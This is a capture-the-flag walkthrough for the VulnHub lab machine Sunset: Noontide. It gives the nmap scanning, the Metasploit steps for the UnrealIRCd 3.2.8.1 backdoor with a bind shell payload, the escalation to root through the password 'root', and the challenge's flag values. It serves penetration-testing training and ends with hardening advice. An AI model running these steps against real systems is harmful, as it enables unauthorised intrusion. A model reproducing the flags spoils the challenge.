# Sunset: Noontide (VulnHub)

## Overview

**Sunset: Noontide** is a Very Easy-level VulnHub machine created by **whitecr0wz**. The machine focuses on service enumeration, vulnerability identification, exploitation of the UnrealIRCd 3.2.8.1 backdoor, and privilege escalation through weak root credentials.

The challenge demonstrates how a single vulnerable network service combined with poor credential management can lead to complete system compromise. 

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Sunset: Noontide |
| Author | whitecr0wz |
| Series | Sunset |
| Platform | VulnHub |
| Release Date | 9 August 2020 |
| Difficulty | Very Easy |
| Target OS | Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve Proof Flag |

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Vulnerability Assessment
- UnrealIRCd Enumeration
- Exploit Research
- Metasploit Framework
- Remote Code Execution
- Shell Access
- Linux Enumeration
- Privilege Escalation
- Credential Security Assessment
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- Metasploit Framework
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target host.
2. Enumerate open services.
3. Identify UnrealIRCd service.
4. Research known vulnerabilities.
5. Exploit UnrealIRCd 3.2.8.1 Backdoor.
6. Obtain shell access as user server.
7. Enumerate local system.
8. Discover weak root credentials.
9. Escalate privileges to root.
10. Retrieve proof flag.

## Network Discovery

Identify active hosts:

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.17
```

Target successfully identified. 

## Open Services Identified

Perform service enumeration:

```bash
sudo nmap -sC -sV -Pn <target-ip> --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|--------|---------|---------|
| 6667 | IRC | UnrealIRCd |

Additional Information:

```text
Host: irc.foonet.com
```

Only a single network service was exposed by the target. 

## Vulnerability Identification

Researching the detected service revealed a known vulnerability:

```text
UnrealIRCd 3.2.8.1 Backdoor
```

The backdoor vulnerability allows remote command execution through malicious code inserted into the source distribution of UnrealIRCd. 

## Exploitation

### Launch Metasploit

```bash
msfconsole -q
```

Load the exploit module:

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

Configure the target:

```bash
set rhosts <target-ip>
```

Display available payloads:

```bash
show payloads
```

Select payload:

```bash
set payload cmd/unix/bind_perl
```

Run the exploit:

```bash
exploit
```

Successful exploitation resulted in a command shell session on the target. 

## Initial Access

Verify privileges:

```bash
id
```

Output:

```text
uid=1000(server) gid=1000(server)
```

Check current user:

```bash
whoami
```

Output:

```text
server
```

Initial access successfully obtained as user **server**. 

## User Enumeration

List user directories:

```bash
ls -la /home
```

Enumerate the user's home directory:

```bash
ls -la /home/server
```

Interesting file discovered:

```text
local.txt
```

Retrieve the local flag:

```bash
cat /home/server/local.txt
```

Output:

```text
c53c08b5bf2b0801c5d0c24149826a6e
```

User enumeration completed successfully. 

## Privilege Escalation

Attempt switching to root:

```bash
su root
```

Password used:

```text
root
```

Authentication succeeded due to weak root credentials. 

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Root shell successfully obtained. 

## Root Flag

Navigate to the root directory:

```bash
ls -la /root
```

Interesting file discovered:

```text
proof.txt
```

Read the flag:

```bash
cat /root/proof.txt
```

Output:

```text
ab28c8ca8da1b9ffc2d702ac54221105
```

Root compromise successfully achieved. 

## Vulnerabilities Identified

### 1. UnrealIRCd 3.2.8.1 Backdoor

A known backdoor vulnerability allowed unauthenticated remote code execution.

### 2. Remote Command Execution

The exposed IRC service allowed direct exploitation resulting in shell access.

### 3. Weak Root Credentials

The root account used a weak and easily guessable password:

```text
root
```

### 4. Poor System Hardening

Lack of proper security controls enabled rapid privilege escalation after initial access. 

## Attack Chain Summary

- Host Discovery using Netdiscover
- Service Enumeration using Nmap
- UnrealIRCd Identification
- Vulnerability Research
- Metasploit Exploitation
- Shell Access as server
- Local Flag Discovery
- Weak Root Password Discovery
- Root Access
- Proof Flag Retrieval

## Security Recommendations

- Upgrade UnrealIRCd to a secure version.
- Remove vulnerable software immediately.
- Disable unnecessary network services.
- Enforce strong password policies.
- Restrict root login access.
- Implement least privilege principles.
- Conduct regular vulnerability assessments.
- Monitor exposed services continuously.
- Use multi-factor authentication where possible.
- Perform periodic penetration testing.

## Key Learning Outcomes

- Service enumeration is critical during reconnaissance.
- Publicly known vulnerabilities remain highly dangerous.
- Exploit databases and Metasploit can quickly validate vulnerabilities.
- Weak credentials often result in complete compromise.
- Proper patch management is essential.
- System hardening significantly reduces attack surface.
- Small misconfigurations can result in full system takeover.

## Flags

### User Flag

```text
c53c08b5bf2b0801c5d0c24149826a6e
```

### Root Flag

```text
ab28c8ca8da1b9ffc2d702ac54221105
```

## Conclusion

Sunset: Noontide is an excellent beginner-friendly VulnHub machine that teaches vulnerability identification, exploitation of known service backdoors, shell acquisition, Linux enumeration, and privilege escalation through weak credentials. The machine highlights the importance of patch management and strong authentication practices. 

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
